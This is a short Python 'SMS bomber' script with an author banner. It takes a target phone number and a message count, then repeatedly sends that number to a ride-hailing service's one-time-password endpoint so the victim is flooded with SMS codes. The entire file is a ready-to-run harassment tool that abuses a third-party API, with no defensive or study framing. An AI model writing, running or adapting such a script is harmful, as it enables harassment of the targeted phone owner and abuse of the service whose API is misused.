import requests as req
import time
from colorama import Fore
print(Fore.GREEN+'''

 _____                _   _           _____         
/  ___|              | | | |         |_   _|        
\ `--. _ __ ___  ___ | |_| |_   _ _ __ | | ___ _ __ 
 `--. \ '_ ` _ \/ __||  _  | | | | '_ \| |/ _ \ '__|
/\__/ / | | | | \__ \| | | | |_| | | | | |  __/ |   
\____/|_| |_| |_|___/\_| |_/\__,_|_| |_\_/\___|_|   

_________________________________________

● Mr Soheil HuNteR
● Sms Bomber
● Me ID Tel.Rubik : @Cr_3lebriti
● Phone number : 0905000000
_________________________________________

''')

phone=int(input(Fore.GREEN+"[ Phone targit ]"+Fore.RED+" =>" ))
num =int(input(Fore.GREEN+"Number Sms"+Fore.RED+" =>" ))
print(Fore.GREEN+"Start"+Fore.RED+"..")
url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
data ={"cellphone": phone}
for i in range(0,num):
    req.session()
    time.sleep(2)
    r =req.post(url,data)
    print(Fore.GREEN+"[~]"+Fore.RED+"[ send ]")
